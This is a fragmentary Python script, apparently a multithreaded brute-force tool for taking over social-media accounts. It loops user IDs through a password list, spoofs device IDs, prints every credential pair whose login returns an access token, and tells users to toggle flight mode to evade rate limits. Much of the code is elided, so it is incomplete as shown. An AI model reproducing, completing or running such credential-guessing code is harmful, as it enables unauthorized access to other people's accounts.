...
"\033[0;31m"-----WIFI-WORKING-70%/MOBILE DATA-99.99% 
...
def bhoot():
    ...
    with ThreadPool(max_workers=50) as TANIM:
        tl = str(len(user))
        print('\x1b[38;5;155m[➤] \x1b[38;5;222mUSE FLIGHT MOD  GET MORE OK IDS <>~~~');linex()
        for love in user:
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] MR-MAFUZ  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[MR-MAFUZ]'+ids+' ~~ '+pas+'\x1b[38;5;155m')
